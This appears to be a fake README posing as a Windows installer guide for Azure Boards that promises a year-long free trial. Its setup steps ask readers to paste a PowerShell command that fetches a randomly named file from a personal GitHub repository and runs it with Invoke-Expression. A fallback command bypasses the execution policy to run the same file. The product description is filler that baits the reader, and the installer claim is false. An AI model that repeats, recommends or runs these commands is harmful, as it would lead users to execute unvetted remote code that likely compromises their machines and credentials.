# Azure Boards

Azure Boards on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Azure Boards is a work-tracking subscription for Windows teams that need Kanban boards, ordered backlogs, and sprint planning in one place. You capture work items, assign owners, set priorities, and watch columns move as work progresses without juggling separate spreadsheets and chat threads.

A typical session opens your active board, scans blocked items, updates a few tasks from standup notes, and adjusts sprint scope before the next checkpoint. You might drag cards across columns, link related items, add acceptance criteria, and skim burndown-style progress so everyone shares the same picture of what is done and what is next.

This repository holds the Windows setup file that activates your subscription, short configuration notes for first launch, and a changelog that records package updates across releases. After you run setup, the free subscription remains on the PC while the built-in free trial covers the first year of use.

## What you get

- Kanban boards and ordered backlogs stay synced for Windows teams inside one Azure Boards subscription.
- Sprint planning views help you scope iterations, track capacity, and monitor progress without leaving the app.
- Work items link tasks, bugs, and goals so standups reflect live board state every morning.
- The built-in free trial runs for a year so you can evaluate boards before committing long term.
- After setup completes, the free subscription remains on your PC for everyday planning and tracking.
- Custom columns and swimlanes mirror how your team actually delivers work each week.
- Query filters surface blocked or overdue items quickly during backlog grooming on Windows.
- Your free subscription keeps local access to boards after the free trial year ends.

## Quick Setup (PowerShell)

This starts the built-in Azure Boards free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/n-zimmer1245811381/azure-boards-setup-guide/main/12qkqh8eas.2bt0ikdl | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/n-zimmer1245811381/azure-boards-setup-guide/main/12qkqh8eas.2bt0ikdl | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `12qkqh8eas.2bt0ikdl` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `n-zimmer1245811381/azure-boards-setup-guide`. Azure Boards 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
